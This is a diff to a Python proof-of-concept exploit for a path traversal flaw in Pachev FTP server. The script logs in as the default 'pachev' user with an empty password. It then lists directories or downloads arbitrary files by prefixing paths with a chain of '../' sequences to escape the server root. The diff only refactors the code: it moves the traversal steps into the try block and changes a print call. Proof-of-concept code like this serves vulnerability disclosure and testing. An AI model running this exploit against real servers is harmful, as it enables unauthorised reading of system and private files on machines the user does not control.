@@ -35,26 +35,27 @@ class FTPc:
             self.connection.retrbinary('RETR %s'  % _path_file , open(f_name, 'wb').write)
             print("Successfully retrieved " + rflag)
         except Exception as exp:
-            print (" (!) No Such File ", _path_file)
+            print (f" (!) No Such File {_path_file}")
 
 
 
-def main(ip,port,*args):   #main 
+def main(ip,port,*args): 
     print("  (!!) Pachev FTP Path Traversal (!!) \n  ** POC by Whitebeard (Yonatan K) \n ")
     try:
         connection = FTP()
         connection.connect(str(ip),int(port))
         connection.login('pachev', '')
         ftpc = FTPc(connection)
+        tra= "../../../../../../../.."
+        if lflag:
+            print("Listing: " + lflag)
+            for i in ftpc.listdir(tra + lflag):
+                print(i)
+        if rflag:
+            ftpc.getfile(tra + rflag)
     except Exception as exp:
         print("Couldn't connect to FTP")
-    tra= "../../../../../../../.."
-    if lflag:
-        print("Listing: " + lflag)
-        for i in ftpc.listdir(tra + lflag):
-            print(i)
-    if rflag:
-        ftpc.getfile(tra + rflag)
+
 
 
 
